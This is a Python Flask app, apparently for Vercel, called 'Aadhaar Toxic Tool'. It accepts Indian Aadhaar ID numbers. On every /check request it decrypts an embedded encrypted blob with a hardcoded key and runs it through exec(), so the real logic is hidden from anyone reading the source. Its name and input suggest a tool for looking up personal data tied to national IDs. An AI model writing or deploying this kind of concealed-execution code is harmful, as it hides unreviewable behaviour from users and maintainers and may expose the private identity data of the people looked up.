from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
import sys
import io

app = Flask(__name__)

k = b'u76_X8M9T3V5z_X1L0v_pQ9a2B4n6M8k0L2j4H6G8F0='
c = b'gAAAAABqBbjyrqh19jnNa6eVlZ-NV_5ThxV2rC6nP3ZW8xlqIsztg0fNgDn6GnVjW2iOfm4t2sEEErTTMBRuWRWXB3LOenyJsCpWd1mHt6cfBQ-2HlpzjxK6dJ80p7Emtw0cvDtkcGmFAHIy5byoUa2qr3VqKTO-42gbLCF0aRCz5t8xgNdLSO5elQ-pYdzB7Eh8BUHAVwfVX2-uz9S0XyUpiJM51uatFqvOEdguscClsan1POgdjmLGfV_tKh07U441qGq3Gk7EiBOcblIWl9IrYnCTbs6NSr6uoJqE78iKQhbWGQUm0YviRo82W1Fc8TEoDOdK1_DpE3NblXM_L5ywbI2gb2qJmcaDvmYaJ4ql5O945JPt1JGKHXcha71Ekh7Vd531gOJtlvoYMfuOWWOnGfg7zpKceufapz4gujLRJHbqKuVLSVpwAbgrUdjZ88OlJrbO3AAPQykksQkmR1qTdlZ6riwU4ePEcmfYs4X-allMnm2RhD9NjGIvs5LoG6rpXi_JqAiLtbWongDz5R2gwV8Q5J_ZX7ZVx8ycLzyt5J3IydSnj_2MVwPSvlxzm6qRU-F4qbM1SmRHgVaMN4tdTFTso6LJ40MPhuFKTVtGm97-3UvrFOg-YC7S-Kvfo51f77Q6kk2Q14zIihK2IOcIk_Bq_qNJYJCiZuUnKL4wT3lq7IPRrz7denx_1aNITDjU6mgDDsu_abs6XKXfcpBEf_v31bDCsjzIV1n1LfkwVOW74DccQ7YSSBvnVnXGFmLAv1HtN9zmUcV-yXd9Pw57kKhpmBgCAs290dcKSbXGzVPIG-luxFYUGVJUuDOIy_LOT7xl7LNWn95oThDkEQlxz3kWUwdi8ymfcFLJSayWCe8bZL1hi66fIG06SIq-xXNxOXRVmwleg4vxc34fcGNL2GBdMpMu9FCg_CASsrkiLQHYRGzk52HZJJcbYbmtbDly3ZAYg9uevh9g0FhSCZSGNvXrA48lz9GaAdMssIPGuNUlVrmlWDaihNioQTC5wIH9bmY8genEiPGdmolSTXYWbMZOBumk9HAaz97oDkpyT2C3K9N2DBIu-EONkUErhDu3VZ4Xd9x4yNw1D8WZJF1hcqDypx66w-CuSqdxudWa4Hz540YDde6mldPVHfv4tJYWKjgqQpZyw-cmajIW4_pNvm6WoJenH-Cw3aj2MCLEGjx6o1lRfA3cvIpN701d_J8kvhkMdeVQEODyOg-XzU2sfP1XGLtvWL_kUXi1HIJevtBEtsQud9XyVw8aJClGQW04jdZ33_1f0bwctbaxT3cBJPEANsZZWNOOTbNNFNagxDScSLYq1xKNrNRvntlPMuRZUZAmdaabpMvh_HNDOpHyaRVNVq1Y8vOQ592IoAMrLo0GzKJAAvRKqcqsw6EwxzaGszEgnjMTlHyosC9mI9rQY3EKiOxGIGFR7TDfc5B1HJb5xUXmpcxW1n1ARo1HYWgRxI8XzvgELqdL4mJEK9NROv8yQr1bpsNSiuC0CUb9x3qu641yHp79QKJxja0Zva-fkEaFh_kHeuTWAPRGMlQWmgT2iWGGNP7CuQtdmL1DG7kbaTAl8cZAt5FdWhUZKJmn3Cgo2bPwvJK9wpHRu61PsdhTp8VUDOnUBVY7y8x2XTADlB9U_MZEk2VpVvJWmTi3HUobX_zQH7fHsgv_pR0atOGl-8HbVL6b3Osn0WP7pFH6Xu8xI2m80yqycd9oxJPDSIRs09jCai22JtUhgp4ezwesLoaooZKpUf3dzC7Dmw-2GcBV2NaGYfyddwxxdEnPnCJGMgxTtu7AmgpAbVmeJb9ZoIwGMzIolanIjCph8vRXehg4UIqZwcMJaoZHzUvH-fPDc9eypBrbG2qek-9zR2YwP4K48z2C_vVaXpgI09lBRBga18d-K9-haIliF6QgtNVWf7wprL0yTLxd8XeCADI89R02BeszE3TBqwdRPvA147kIgatqXZnbLyZzTxgHjkCfgXiQrmI3tTBWaQT877YMEwxqGMrQAYWC2C0j-iQ1UsV3Xwn_4nj4N3BHL7noKyvagUlluYPZNgGAoQezaH6wf5kRI14JhFhtA2yHm8eT81xqR6bE8D_3YLWL3q7o9nYw9NPVznNlCG2aM-mKJON23Yli4LwNIoraJpkgbg4IaELnstdvA5KFLspnmYzotNThJkwSrkL4OOnQq70Zf8keL4zYkiQtusqTdJUJJP-fU6qiuiX2uYtAj_3EnKLPBEmBgif-41F3cNlXM4xfzouzU1cRDr7jZUH38zIguhK6ADR_gj9SX-M3NRxLQqkWu_IK4YeQg6Sz1pYssD9fe1uy5lraDUAp8EBNtFY8JJD98UJINyKDZzu612po2CJQFlw28XV5ZvI14CwTRlyV47FaAuKq8Z3AAyPZxO0P1ygtWcWUYlvrsEhMb3wvbAp801sZxhZRm_4DtFN2Nf2YJuOaJ0yaLA=='

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "success",
        "message": "Aadhaar Toxic Tool LIVE 🔥",
        "usage": "POST to /check with aadhar number"
    })

@app.route('/check', methods=['GET', 'POST'])
def check():
    try:
        cipher = Fernet(k)
        decoded_code = cipher.decrypt(c).decode('utf-8')
        
        old_stdout = sys.stdout
        sys.stdout = mystdout = io.StringIO()
        exec(decoded_code, globals())
        sys.stdout = old_stdout
        
        # Get aadhar from query or body
        if request.method == 'POST':
            data = request.get_json(silent=True) or {}
        else:
            data = request.args.to_dict()
            
        aadhar = data.get('aadhar') or data.get('number')
        
        return jsonify({
            "status": "success",
            "message": "Tool Executed Successfully",
            "aadhar": aadhar,
            "note": "Decrypted logic running"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# Vercel Handler
def handler(request):
    from werkzeug.wrappers import Request
    req = Request(request.environ)
    with app.request_context(req):
        if req.path == '/check':
            return check()
        return home()

if __name__ == '__main__':
    app.run()
